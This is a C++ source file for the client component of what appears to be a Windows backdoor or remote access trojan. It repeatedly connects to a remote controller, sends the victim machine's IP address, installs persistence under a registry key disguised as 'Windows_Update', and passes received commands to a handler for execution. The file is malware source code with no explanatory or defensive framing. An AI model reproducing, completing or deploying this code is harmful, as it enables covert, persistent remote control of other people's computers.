#include "Client.h"
#pragma warning(disable:4996) 
#define SIZE_BUFFER 256
#define DEFAULT_KEYNAME L"Windows_Update"

Client::Client(const char* addr,const unsigned short &port) : Socket_()
{
	
	SOCKADDR_IN sin;
	int val;
	this->setSock(socket(AF_INET, SOCK_STREAM, 0));
	sin.sin_addr.s_addr = inet_addr(addr);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	std::cout << "[*] Connection to " << addr << ":" << port << std::endl;
	val = connect(*(this->getSock()), (SOCKADDR *)&sin, sizeof(sin));

	while (val != 0)
	{
		Sleep(1000);
		if (val == INVALID_SOCKET)
		{
			this->setError(1);
			std::cout << "Can't reach : " << addr<<":" << port << std::endl;
		}
		
		val = connect(*(this->getSock()), (SOCKADDR *)&sin, sizeof(sin));

	}
	std::cout << "[*] Successfuly connected " << std::endl;
	init();
}

bool Client::init()
{
	try
	{
		setIp(Auto::get_ip());
	}
	catch (std::exception& e)
	{
		setIp("0.0.0.0");
	}
	std::cout << getIp() << std::endl;
	send_b(getIp().c_str());
	
	if (Auto::persistence(DEFAULT_KEYNAME))
	{
		send_b("Successfull persistence !");
	}
	else
		send_b("Can't put persistence ..");
		
	return 1;
}
Client::~Client()
{}

bool Client::send_b(const char* pbuffer)
{
	if (send(*(this->getSock()), pbuffer, SIZE_BUFFER, 0) == 0)
		return 1;
	else
		return 0;
}

bool Client::recv_b()
{
	char b[SIZE_BUFFER] = { 0 };
	if ((recv(*(this->getSock()), b, sizeof(b), 0) > 0))
	{
		this->setBuffer(b);
		Factory_Client fact(this, b);
		Sleep(300);
		return 1;
	}
	else
		std::cout << "Ernno : " << errno << std::endl;
		this->setBuffer("exit");
		return 0;
}
void Client::setIp(const std::string& pIp) { Ip = pIp; }
std::string Client::getIp() const { return Ip; }